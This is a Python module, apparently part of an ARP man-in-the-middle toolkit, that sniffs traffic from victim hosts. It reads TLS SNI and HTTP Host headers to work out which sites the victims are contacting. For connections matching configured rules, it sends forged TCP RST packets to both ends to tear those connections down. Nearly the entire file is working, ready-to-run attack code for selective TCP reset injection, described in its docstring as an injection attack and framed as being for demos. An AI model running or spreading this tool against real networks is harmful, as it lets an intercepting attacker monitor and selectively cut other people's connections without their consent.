"""
connection_killer.py — Selective TCP connection killer for active MITM.

Sends crafted TCP RST packets to tear down specific connections that
flow through this machine while ARP MITM is active. Useful for "block
this one service" demos — e.g., kill TCP to ``twitter.com:443`` without
disrupting the rest of the victim's traffic.

Rule format: each rule is ``(pattern, port)`` where:

* ``pattern`` is an IP / CIDR / substring of a destination hostname /
  ``*`` wildcard. Matching is best-effort:

    - If the rule is a literal IPv4 or IPv4-with-prefix, it matches the
      destination IP of the connection.
    - Otherwise the pattern is matched (substring or fnmatch wildcard)
      against the destination IP **and** against any TLS SNI / HTTP Host
      header seen earlier on this 5-tuple (the inspector layer feeds us
      that mapping).

* ``port`` — an integer destination port, or ``0`` to match any.

The killer sniffs packets in promiscuous mode on the MITM interface,
identifies the 5-tuple of each candidate connection, and dispatches a
spoofed RST to both endpoints. Forwarding is unaffected; this is purely
an injection attack at the TCP layer.

Fail-soft if Scapy is unavailable — the module imports cleanly but
``start()`` raises a friendly RuntimeError.
"""

from __future__ import annotations

import collections
import fnmatch
import ipaddress
import re
import threading
import time
from typing import Optional

try:
    from scapy.all import sniff, send  # type: ignore
    from scapy.layers.inet import IP, TCP  # type: ignore
    from scapy.packet import Raw  # type: ignore

    SCAPY_AVAILABLE = True
except Exception:
    SCAPY_AVAILABLE = False


_IPV4_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}(?:/\d{1,2})?$")
_HTTP_HOST_RE = re.compile(rb"\r\nHost:\s*([^\r\n]+)", re.IGNORECASE)


def _is_ip_or_cidr(s: str) -> bool:
    if not _IPV4_RE.match(s):
        return False
    try:
        ipaddress.ip_network(s, strict=False)
        return True
    except ValueError:
        return False


def _ip_matches_rule(ip_str: str, pattern: str) -> bool:
    try:
        network = ipaddress.ip_network(pattern, strict=False)
        return ipaddress.ip_address(ip_str) in network
    except ValueError:
        return False


def _name_matches_rule(name: str, pattern: str) -> bool:
    """Wildcard or substring match for hostnames."""
    name = (name or "").lower().strip().rstrip(".")
    pattern = (pattern or "").lower().strip().rstrip(".")
    if not (name and pattern):
        return False
    if "*" in pattern or "?" in pattern:
        return fnmatch.fnmatchcase(name, pattern)
    return pattern in name or name == pattern


def _extract_tls_sni(payload: bytes) -> Optional[str]:
    """Re-implementation of the SNI parser (kept private to this module)."""
    try:
        if len(payload) < 6 or payload[0] != 0x16:
            return None
        if len(payload) < 5 + 4 + 2 + 32 + 1:
            return None
        if payload[5] != 0x01:
            return None
        idx = 5 + 4 + 2 + 32
        if idx >= len(payload):
            return None
        sid_len = payload[idx]
        idx += 1 + sid_len
        if idx + 2 > len(payload):
            return None
        cs_len = int.from_bytes(payload[idx:idx + 2], "big")
        idx += 2 + cs_len
        if idx + 1 > len(payload):
            return None
        cm_len = payload[idx]
        idx += 1 + cm_len
        if idx + 2 > len(payload):
            return None
        ext_len = int.from_bytes(payload[idx:idx + 2], "big")
        idx += 2
        ext_end = min(idx + ext_len, len(payload))
        while idx + 4 <= ext_end:
            ext_type = int.from_bytes(payload[idx:idx + 2], "big")
            ext_size = int.from_bytes(payload[idx + 2:idx + 4], "big")
            idx += 4
            if ext_type == 0x00:
                if idx + 5 > len(payload):
                    return None
                name_len = int.from_bytes(payload[idx + 3:idx + 5], "big")
                start = idx + 5
                end = start + name_len
                if end > len(payload):
                    return None
                return payload[start:end].decode("utf-8", errors="replace")
            idx += ext_size
        return None
    except Exception:
        return None


# ---------------------------------------------------------------------------
# ConnectionKiller
# ---------------------------------------------------------------------------

class ConnectionKiller:
    """Selectively reset TCP connections from MITM'd victims by rule.

    Each ``rule`` is a tuple ``(pattern, port)``:

    * ``pattern`` — IPv4 / CIDR (matches destination IP) **or** hostname
      substring / wildcard (matches against TLS SNI / HTTP Host).
    * ``port`` — destination port, or ``0`` for any.

    Maintains per-rule and per-target hit counters via :meth:`snapshot`.
    """

    KILL_LIMIT = 500

    def __init__(
        self,
        iface: Optional[str],
        rules: list[tuple[str, int]],
        target_ips: list[str],
    ) -> None:
        self.iface = iface
        self.rules: list[tuple[str, int]] = []
        for pat, port in rules:
            pat = (pat or "").strip()
            try:
                port_i = int(port)
            except (TypeError, ValueError):
                port_i = 0
            if not pat or port_i < 0 or port_i > 65535:
                continue
            self.rules.append((pat, port_i))
        self.target_ips = set(t for t in target_ips if t)
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self.kills: int = 0
        self.recent_kills: collections.deque = collections.deque(
            maxlen=self.KILL_LIMIT,
        )
        # Cache the host-name observed for each (victim, peer, dport) 5-tuple
        # so rules expressed by domain still match later packets on the same
        # connection (after TLS handshake / HTTP-Host header is gone).
        self._flow_hostname: dict[tuple, str] = {}
        # Don't keep killing the same connection on every packet — track
        # seq we've already RST'd in the last 30s.
        self._killed_flows: dict[tuple, float] = {}
        self.started_at: float = 0.0

    # ------------------------------------------------------------------ #

    @property
    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    @property
    def uptime_seconds(self) -> float:
        return time.time() - self.started_at if self.started_at else 0.0

    def start(self) -> None:
        if not SCAPY_AVAILABLE:
            raise RuntimeError("Scapy is required for TCP connection killer.")
        if not self.rules:
            raise RuntimeError(
                "No connection-kill rules defined. Add at least one row."
            )
        if self.is_running:
            return
        self._stop_event.clear()
        self.started_at = time.time()
        self._thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=2.0)
            self._thread = None

    def snapshot(self) -> dict:
        with self._lock:
            return {
                "running":      self.is_running,
                "uptime":       self.uptime_seconds,
                "rules":        list(self.rules),
                "kills":        self.kills,
                "recent_kills": list(self.recent_kills),
            }

    # ------------------------------------------------------------------ #

    def _rule_matches(
        self, dst_ip: str, dport: int, host_hint: str,
    ) -> Optional[tuple[str, int]]:
        for pat, port in self.rules:
            if port and port != dport:
                continue
            if _is_ip_or_cidr(pat):
                if _ip_matches_rule(dst_ip, pat):
                    return pat, port
            else:
                if host_hint and _name_matches_rule(host_hint, pat):
                    return pat, port
        return None

    def _sniff_loop(self) -> None:
        # Capture both directions for any target host. Restricting to TCP
        # halves the volume; the kernel still forwards everything.
        bpf_parts = ["tcp"]
        if self.target_ips:
            bpf_parts.append(
                "(" + " or ".join(f"host {ip}" for ip in self.target_ips) + ")"
            )
        bpf = " and ".join(bpf_parts)
        try:
            sniff(
                iface=self.iface,
                filter=bpf,
                prn=self._on_packet,
                store=False,
                stop_filter=lambda _p: self._stop_event.is_set(),
            )
        except Exception:
            pass

    def _on_packet(self, packet) -> None:
        try:
            if not (packet.haslayer(IP) and packet.haslayer(TCP)):
                return
            ipl = packet[IP]
            tcpl = packet[TCP]
            src_ip = ipl.src
            dst_ip = ipl.dst
            sport = int(tcpl.sport)
            dport = int(tcpl.dport)

            # We only care about connections sourced from one of our victims.
            victim = None
            if src_ip in self.target_ips:
                victim = src_ip
                peer_ip, victim_port, peer_port = dst_ip, sport, dport
            elif dst_ip in self.target_ips:
                victim = dst_ip
                peer_ip, victim_port, peer_port = src_ip, dport, sport
            else:
                return

            # Identify the connection by its 4-tuple (victim, peer, peer_port).
            # We don't include victim_port so later packets on the same flow
            # are recognised even though the port doesn't change for the life
            # of a connection.
            flow = (victim, peer_ip, peer_port)

            # Extract host hint from TLS / HTTP if this is the client→server
            # direction and the payload is the first record.
            host_hint = self._flow_hostname.get(flow, "")
            if not host_hint and src_ip == victim and packet.haslayer(Raw):
                payload = bytes(packet[Raw].load)
                if peer_port == 443 and payload and payload[0] == 0x16:
                    sni = _extract_tls_sni(payload)
                    if sni:
                        host_hint = sni
                        self._flow_hostname[flow] = sni
                elif peer_port == 80:
                    m = _HTTP_HOST_RE.search(payload, 0,
                                              min(len(payload), 4096))
                    if m:
                        host_hint = m.group(1).decode("ascii", "replace").strip()
                        self._flow_hostname[flow] = host_hint

            match = self._rule_matches(peer_ip, peer_port, host_hint)
            if match is None:
                return

            # Throttle: only one RST per flow per 30s.
            now = time.time()
            last = self._killed_flows.get(flow, 0)
            if now - last < 30:
                return
            self._killed_flows[flow] = now

            # Build a forged RST aimed at *both* endpoints of the flow.
            # ACK is set so middleboxes / stateful firewalls accept it.
            seq = int(tcpl.ack) if int(tcpl.flags) & 0x10 else 0
            ack = int(tcpl.seq) + (len(packet[Raw].load) if packet.haslayer(Raw) else 1)

            rst_to_peer = IP(src=src_ip, dst=dst_ip) / TCP(
                sport=sport, dport=dport,
                flags="R", seq=int(tcpl.seq) + 1,
            )
            rst_to_victim = IP(src=dst_ip, dst=src_ip) / TCP(
                sport=dport, dport=sport,
                flags="R", seq=seq, ack=ack,
            )
            try:
                send(rst_to_peer, iface=self.iface, verbose=0)
                send(rst_to_victim, iface=self.iface, verbose=0)
            except Exception:
                return

            with self._lock:
                self.kills += 1
                self.recent_kills.append({
                    "ts":         now,
                    "victim":     victim,
                    "peer":       peer_ip,
                    "peer_port":  peer_port,
                    "hostname":   host_hint,
                    "rule":       match[0],
                })
        except Exception:
            pass
